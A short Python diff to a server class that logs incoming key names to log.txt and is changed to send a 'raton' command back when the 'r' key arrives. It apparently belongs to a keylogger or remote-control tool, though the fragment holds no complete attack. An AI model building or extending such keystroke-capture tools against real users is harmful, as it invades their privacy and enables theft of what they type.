@@ -14,8 +14,9 @@ class servidore(Server):
         with open("log.txt","a") as f:
             f.write(tecla)
         if tecla == "Key.esc":
-            self.con.close()
             sys.exit()
+        if tecla=="'r'":
+            self.con.send("raton".encode())
 
     
     def run(self):
